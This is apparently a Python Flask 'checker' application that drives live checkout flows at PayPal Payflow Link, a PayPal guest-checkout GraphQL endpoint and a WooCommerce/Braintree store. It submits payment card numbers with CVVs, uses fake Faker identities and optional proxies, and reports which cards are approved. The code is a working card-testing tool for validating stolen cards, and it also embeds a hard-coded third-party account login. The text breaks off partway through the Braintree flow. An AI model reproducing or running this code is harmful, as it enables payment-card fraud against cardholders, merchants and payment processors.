# ============================================
# app.py - CHECKER UNIFICADO CON FLASK PARA RENDER
# ============================================

# ============================================
# 1. IMPORTS
# ============================================
import asyncio
import random
import time
import base64
import uuid
import re
import json
from faker import Faker
import httpx
from datetime import datetime
from urllib.parse import quote_plus
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# ============================================
# 2. CLASS Tools - HERRAMIENTAS COMUNES
# ============================================
class Tools:
    @staticmethod
    def getcard(card: str, fm: int = 1, fy: int = 4) -> dict:
        cc, mm, yy, cvv = card.split("|")
        mm = mm.lstrip('0') or '0' if fm == 1 else mm.zfill(2)
        yy = yy[-2:] if fy == 2 else (f"20{yy}" if len(yy) == 2 else yy)
        return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}
    
    @staticmethod
    def find_between(s: str, first: str, last: str) -> str | None:
        try: 
            return s.split(first, 1)[1].split(last, 1)[0]
        except: 
            return None
    
    @staticmethod
    def userdata() -> dict:
        f = Faker()
        fn, ln = f.first_name(), f.last_name()
        return {
            "name": f"{fn} {ln}", 
            "first": fn, 
            "last": ln,
            "address": f.street_address(), 
            "city": f.city(), 
            "state": f.state_abbr(), 
            "zip": f.postcode(),
            "email": f.email(), 
            "phone": f"2{random.randint(10**8, 10**9-1)}"
        }
    
    @staticmethod
    def get_card_type(cc_first: str) -> str:
        return {"5": "MASTER_CARD", "3": "AMEX", "6": "DISCOVER"}.get(cc_first, "VISA")
    
    @staticmethod
    def generate_session_id() -> str:
        return str(uuid.uuid4())
    
    @staticmethod
    def ext_rep(text: str) -> str | None:
        reason_match = re.search(r'Reason:\s*(.+?)(?:\.|$|<|\)|\[|\n)', text)
        if reason_match:
            return reason_match.group(1).strip()
        return None

    @staticmethod
    async def get_httpx_model(prox=None):
        proxy = None
        if prox:
            if "://" not in prox:
                proxy = f"http://{prox}"
            else:
                proxy = prox
        return httpx.AsyncClient(proxy=proxy, timeout=30.0)

# ============================================
# 3. CHECKER 1: PAYFLOW AVS
# ============================================
class PayflowChecker:
    @staticmethod
    async def code(card, proxy=None):
        card_data = Tools.getcard(card, 2, 2)
        session = await Tools.get_httpx_model(proxy)
        user_data = Tools.userdata()
        status = False
        resp = "Gate error"
        try:
            ######## code ########
            headers = {'accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'es-419,es;q=0.8','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://test.tppowerusa.com','priority': 'u=1, i','referer': 'https://test.tppowerusa.com/escs/airplane-system/ztw-brushless-speed-controls/ztw-beatles-series-esc/beatles-ztw20a-bec?sort=p.price&order=ASC','sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','sec-gpc': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            data = {'quantity': '1','product_id': '256',}
            response = await session.post('https://test.tppowerusa.com/index.php?route=checkout/cart/add',headers=headers,data=data,)

            headers = {'accept': 'text/html, */*; q=0.01','accept-language': 'es-419,es;q=0.6','priority': 'u=1, i','referer': 'https://test.tppowerusa.com/index.php?route=checkout/checkout','sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','sec-gpc': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            response = await session.get('https://test.tppowerusa.com/index.php?route=checkout/register', headers=headers)

            headers = {'accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'es-419,es;q=0.6','priority': 'u=1, i','referer': 'https://test.tppowerusa.com/index.php?route=checkout/checkout','sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','sec-gpc': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            response = await session.get('https://test.tppowerusa.com/index.php?route=checkout/checkout/customfield&customer_group_id=1',headers=headers,)
            
            headers = {'accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'es-419,es;q=0.6','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://test.tppowerusa.com','priority': 'u=1, i','referer': 'https://test.tppowerusa.com/index.php?route=checkout/checkout','sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','sec-gpc': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}

            data = {'customer_group_id': '1','firstname': user_data["first"],'lastname': user_data["last"],'email': f'{user_data["email"].split("@")[0]}@gmail.com','telephone': user_data["phone"],'fax': '','password': '$%&456RTYrty','confirm': '$%&456RTYrty','company': '','address_1': user_data["address"],'address_2': '','city': user_data["city"],'postcode': '29907','country_id': '223','zone_id': '3666','shipping_address': '1',}
            response = await session.post('https://test.tppowerusa.com/index.php?route=checkout/register/save',headers=headers,data=data,)
            
            headers = {'accept': 'text/html, */*; q=0.01','accept-language': 'es-419,es;q=0.6','priority': 'u=1, i','referer': 'https://test.tppowerusa.com/index.php?route=checkout/checkout','sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','sec-gpc': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            response = await session.get('https://test.tppowerusa.com/index.php?route=checkout/shipping_address',headers=headers,)

            headers = {'accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'es-419,es;q=0.6','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://test.tppowerusa.com','priority': 'u=1, i','referer': 'https://test.tppowerusa.com/index.php?route=checkout/checkout','sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','sec-gpc': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            data = {'shipping_address': 'existing','address_id': '10041','firstname': '','lastname': '','company': '','address_1': '','address_2': '','city': '','postcode': '29907','country_id': '223','zone_id': '3666',}
            response = await session.post('https://test.tppowerusa.com/index.php?route=checkout/shipping_address/save',headers=headers,data=data,)
            
            headers = {'accept': 'text/html, */*; q=0.01','accept-language': 'es-419,es;q=0.6','priority': 'u=1, i','referer': 'https://test.tppowerusa.com/index.php?route=checkout/checkout','sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','sec-gpc': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            response = await session.get('https://test.tppowerusa.com/index.php?route=checkout/shipping_method',headers=headers,)
            
            headers = {'accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'es-419,es;q=0.6','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://test.tppowerusa.com','priority': 'u=1, i','referer': 'https://test.tppowerusa.com/index.php?route=checkout/checkout','sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','sec-gpc': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            data = {'shipping_method': 'flat.flat','comment': '',}
            response = await session.post('https://test.tppowerusa.com/index.php?route=checkout/shipping_method/save',headers=headers,data=data,)
            
            headers = {'accept': 'text/html, */*; q=0.01','accept-language': 'es-419,es;q=0.6','priority': 'u=1, i','referer': 'https://test.tppowerusa.com/index.php?route=checkout/checkout','sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','sec-gpc': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            response = await session.get('https://test.tppowerusa.com/index.php?route=checkout/payment_method', headers=headers)

            headers = {'accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'es-419,es;q=0.6','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://test.tppowerusa.com','priority': 'u=1, i','referer': 'https://test.tppowerusa.com/index.php?route=checkout/checkout','sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','sec-gpc': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            data = {'payment_method': 'paypal_advanced','comment': '',}
            response = await session.post('https://test.tppowerusa.com/index.php?route=checkout/payment_method/save',headers=headers,data=data,)
            
            headers = {'accept': 'text/html, */*; q=0.01','accept-language': 'es-419,es;q=0.6','priority': 'u=1, i','referer': 'https://test.tppowerusa.com/index.php?route=checkout/checkout','sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','sec-gpc': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            response = await session.get('https://test.tppowerusa.com/index.php?route=checkout/confirm', headers=headers)
            SECURETOKEN = Tools.find_between(response.text,"SECURETOKEN=","&amp;")
            SECURETOKENID = Tools.find_between(response.text,'SECURETOKENID=','"')

            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8','Accept-Language': 'es-419,es;q=0.6','Connection': 'keep-alive','Referer': 'https://test.tppowerusa.com/','Sec-Fetch-Dest': 'iframe','Sec-Fetch-Mode': 'navigate','Sec-Fetch-Site': 'cross-site','Sec-Fetch-Storage-Access': 'none','Sec-Fetch-User': '?1','Sec-GPC': '1','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36','sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"',}
            params = {'mode': 'LIVE','SECURETOKEN': SECURETOKEN,'SECURETOKENID': SECURETOKENID,}
            response = await session.get('https://payflowlink.paypal.com/', params=params, headers=headers)

            CSRF_TOKEN = Tools.find_between(response.text,'<input name="CSRF_TOKEN" type="hidden" value="','"')
            INVOICE = Tools.find_between(response.text,'<input name="INVOICE" type="hidden" value="','"')

            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8','Accept-Language': 'es-419,es;q=0.6','Cache-Control': 'max-age=0','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded','Origin': 'https://payflowlink.paypal.com','Referer': 'https://payflowlink.paypal.com/?mode=LIVE&SECURETOKEN=DrTOXmrmRRUu6yyel4bSiqgoF&SECURETOKENID=6a347791f2f310.29943334','Sec-Fetch-Dest': 'iframe','Sec-Fetch-Mode': 'navigate','Sec-Fetch-Site': 'same-origin','Sec-Fetch-Storage-Access': 'none','Sec-Fetch-User': '?1','Sec-GPC': '1','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36','sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"',}
            data = {'subaction': '','CARDNUM': card_data["cc"],'EXPMONTH': card_data["mm"],'EXPYEAR': card_data["yy"],'CVV2': card_data["cvv"],'startdate_month': '','startdate_year': '','issue_number': '','METHOD': 'C','PAYMETHOD': 'C','FIRST_NAME': user_data['first'],'LAST_NAME': user_data['last'],'template': '','ADDRESS': user_data['address'],'CITY': user_data['city'],'STATE': 'SC','ZIP': '29907','COUNTRY': 'US','PHONE': user_data['phone'],'EMAIL': f'{user_data["email"].split("@")[0]}@gmail.com','SHIPPING_FIRST_NAME': user_data['first'],'SHIPPING_LAST_NAME': user_data['last'],'ADDRESSTOSHIP': user_data['address'],'CITYTOSHIP': user_data['city'],'STATETOSHIP': 'SC','ZIPTOSHIP': '29907','COUNTRYTOSHIP': 'US','PHONETOSHIP': '','EMAILTOSHIP': '','TYPE': 'S','SHIPAMOUNT': '0.00','TAX': '0.00','INVOICE': INVOICE,'flag3dSecure': '','CURRENCY': 'USD','STATE': 'SC','swipeData': '0','SECURETOKEN': SECURETOKEN,'SECURETOKENID': SECURETOKENID,'PARMLIST': '','MODE': 'LIVE','CSRF_TOKEN': CSRF_TOKEN,'referringTemplate': 'minlayout',}

            response = await session.post('https://payflowlink.paypal.com/processTransaction.do', headers=headers, data=data)
            AVSDATA = Tools.find_between(response.text,'<input type="hidden" name="AVSDATA" value="','"')
            CVV2MATCH = Tools.find_between(response.text,'<input type="hidden" name="CVV2MATCH" value="','"')
            RESPTEXT = Tools.find_between(response.text,'<input type="hidden" name="RESPTEXT" value="','"')
            resp = f"{RESPTEXT} AVS: {AVSDATA} CVV: {CVV2MATCH}"
            if RESPTEXT == "This transaction cannot be processed. Please enter a valid Credit Card Verification Number.":
                status = True
            ######## end code ########
            await session.aclose()
            return {"message": resp, "success": True, "status": status}
        except Exception as e:
            print(e)
            await session.aclose()
            return {"message": "Gate error", "success": False, "status": False}

# ============================================
# 4. CHECKER 2: PAYPAL GUEST
# ============================================
class PayPalGuestChecker:
    @staticmethod
    async def code(card: str, proxy: str = None) -> dict:
        proxy_f = f"http://{proxy}" if proxy and "://" not in proxy else proxy
        ccd = Tools.getcard(card, 2, 2)
        start = time.time()
        
        for _ in range(3):
            try:
                session = await Tools.get_httpx_model(proxy_f)
                
                # ########### code start #############
                user = Tools.userdata()
                card_type = Tools.get_card_type(ccd['cc'][0])
                
                # ========== >_ Req 1
                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                response = await session.get('https://www.paypal.com/smart/buttons?style.label=donate&style.layout=vertical&style.color=blue&style.shape=pill&style.tagline=false&style.menuPlacement=below&sdkVersion=5.0.390&components.0=buttons&locale.lang=en&locale.country=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWVuMjlWSEhpd2ljZWxsOWx6NGd4Yi1EaV9uNHhlUlkzWkdpd3l1UVk2bV9MUUlrTmNaMHh5ZEFnUE1NbmpFelFxTUNVblBtZ0ZHY2FIZmgmZW5hYmxlLWZ1bmRpbmc9dmVubW8mY3VycmVuY3k9VVNEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF96aHV1bGxtaWxmaXVtY3djamhsZHpyb215bW91eHIifX0&clientID=Aen29VHHiwicell9lz4gxb-Di_n4xeRY3ZGiwyuQY6m_LQIkNcZ0xydAgPMMnjEzQqMCUnPmgFGcaHfh&sdkCorrelationID=f308033f5c550&storageID=uid_e775778837_mja6mzg6mty&sessionID=uid_1a87d97aea_mja6mzg6mty&buttonSessionID=uid_1e550b2bd0_mja6mzg6mty&env=production&buttonSize=small&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjp0cnVlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwid2VjaGF0cGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBheXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmxpayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ0cnVzdGx5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm94eG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfSwic2F0aXNwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGFpZHkiOnsiZWxpZ2libGUiOmZhbHNlfX0&platform=mobile&experiment.enableVenmo=true&experiment.enableVenmoAppLabel=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&enableFunding.0=venmo&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=true&allowBillingPayments=true&disableSetCookie=false', headers=headers)
                
                token = Tools.find_between(response.text, '"facilitatorAccessToken":"', '"')
                if not token:
                    await session.aclose()
                    continue
                
                # ========== >_ Req 2
                headers = {'content-type': 'application/json', 'authorization': f'Bearer {token}'}
                order_data = '{"purchase_units":[{"amount":{"currency_code":"USD","value":"1","breakdown":{"item_total":{"currency_code":"USD","value":"1"}}},"items":[{"name":"Test","unit_amount":{"currency_code":"USD","value":"1"},"quantity":"1","category":"DONATION"}]}],"intent":"CAPTURE"}'
                response = await session.post('https://www.paypal.com/v2/checkout/orders', headers=headers, data=order_data)
                
                order_id = Tools.find_between(response.text, '"id":"', '"')
                if not order_id:
                    await session.aclose()
                    continue
                
                # ========== >_ Req 3
                headers = {'paypal-client-context': order_id, 'x-app-name': 'standardcardfields', 'content-type': 'application/json'}
                json_data = {
                    'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput\n            $paymentToken: String\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n            $feeReferenceId: String\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                paymentToken: $paymentToken\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n                feeReferenceId: $feeReferenceId\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
                    'variables': {
                        'token': order_id,
                        'card': {'cardNumber': ccd['cc'], 'type': card_type, 'expirationDate': f"{ccd['mm']}/{ccd['yy']}", 'postalCode': user['zip'], 'securityCode': ccd['cvv']},
                        'phoneNumber': user['phone'],
                        'firstName': user['first'],
                        'lastName': user['last'],
                        'billingAddress': {'givenName': user['first'], 'familyName': user['last'], 'line1': user['address'], 'line2': None, 'city': user['city'], 'state': user['state'], 'postalCode': user['zip'], 'country': 'US'},
                        'shippingAddress': {'givenName': user['first'], 'familyName': user['last'], 'line1': user['address'], 'line2': None, 'city': user['city'], 'state': user['state'], 'postalCode': user['zip'], 'country': 'US'},
                        'email': user['email'],
                        'currencyConversionType': 'PAYPAL',
                    },
                    'operationName': None,
                }
                response = await session.post('https://www.paypal.com/graphql?fetch_credit_form_submit', headers=headers, json=json_data)
                
                # ========== >_ Response
                msg = Tools.find_between(response.text, '"message":"', '"')
                code = Tools.find_between(response.text, '"code":"', '"')
                
                await session.aclose()
                
                if not code or "success" in response.text.lower():
                    return {"message": "Approved! success", "success": True, "status": True}
                else:
                    return {"message": f"Declined! {msg} ({code})", "success": True, "status": False}

            except Exception as e:
                try:
                    await session.aclose()
                except:
                    pass
                continue
        
        return {"message": "Error! Error de conexion con la api", "success": False, "status": False}

# ============================================
# 5. CHECKER 3: BRAINTREE AUTH
# ============================================
class BraintreeChecker:
    @staticmethod
    async def code(card: str, proxy: str = None) -> dict:
        proxy_f = f"http://{proxy}" if proxy and "://" not in proxy else proxy
        ccd = Tools.getcard(card, 2, 2)
        start = time.time()
        
        for _ in range(3):
            try:
                session = await Tools.get_httpx_model(proxy_f)
                
                # ########### code start #############
                user = Tools.userdata()
                account = ["shamon843738@gmail.com", "shamon843738@gmail.com"]
                email, password = account[0], account[1]
                session_id = Tools.generate_session_id()
                
                # ========== >_ Req 1
                headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en,es;q=0.9', 'cache-control': 'max-age=0', 'referer': 'https://unclejimswormfarm.com/my-account/', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
                response = await session.get('https://unclejimswormfarm.com/my-account/', headers=headers)
                login_nonce = Tools.find_between(response.text, 'name="woocommerce-login-nonce" value="', '"')
                if not login_nonce:
                    await session.aclose()
                    continue
                
                # ========== >_ Req 2
                headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en,es;q=0.9', 'cache-control': 'max-age=0', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://unclejimswormfarm.com', 'referer': 'https://unclejimswormfarm.com/my-account/', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
                data = f'username={email}&password={password}&woocommerce-login-nonce={login_nonce}&_wp_http_referer=%2Fmy-account%2F&login=Log+in'
                response = await session.post('https://unclejimswormfarm.com/my-account/', headers=headers, data=data)
                
                # ========== >_ Req 3
                headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en,es;q=0.9', 'cache-control': 'max-age=0', 'referer': 'https://unclejimswormfarm.com/my-account/payment-methods/', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
                response = await session.get('https://unclejimswormfarm.com/my-account/add-payment-method/', headers=headers)
                payment_nonce = Tools.find_between(response.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
                b_token_encrypted = Tools.find_between(response.text, 'var wc_braintree_client_token = ["', '"];')
                if not payment_nonce or not b_token_encrypted:
                    await session.aclose()
                    continue
                
                # ========== >_ Decode
                b_token_decrypted = str(base64.b64decode(b_token_encrypted))
                btoken = Tools.find_between(b_token_decrypted, '"authorizationFingerprint":"', '","')
                merchant_id = Tools.find_between(b_token_decrypted, 'merchantId":"', '","')
                
                # ========== >_ Req 4
                headers = {'accept': '*/*', 'accept-language': 'en,es;q=0.9', 'authorization': f'Bearer {btoken}', 'braintree-version': '2018-05-10', 'content-type': 'application/json', 'origin': 'https://assets.braintreegateway.com', 'referer': 'https://assets.braintreegateway.com/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
                json_data = {
                    'clientSdkMetadata': {
                        'source': 'client',
                        'integration': 'custom',
                        'sessionId': session_id,
                    },
                    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
                    'variables': {
                        'input': {
                            'creditCard': {
                                'number': ccd['cc'],
                                'expirationMonth': ccd['mm'],
                                'expirationYear': ccd['yy'],
                                'cvv': ccd['cvv'],
                                'billingAddress': {
                                    'postalCode': user['zip'],
                                    'streetAddress': user['address'],
                                },
                            },
                            'options': {'validate': False},
                        },
                    },
                    'operationName': 'TokenizeCreditCard',
                }
                response = await session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
                token_bc = Tools.find_between(response.text, '"token":"', '","')
                if not token_bc:
                    await session.aclose()
                    continue
                
                # ========== >_ Req 5
                headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en,es;q=0.9', 'cache-control': 'max-age=0', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://unclejimswormfarm.com', 'referer': 'https://unclejimswormfarm.com/my-account/add-payment-method/', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
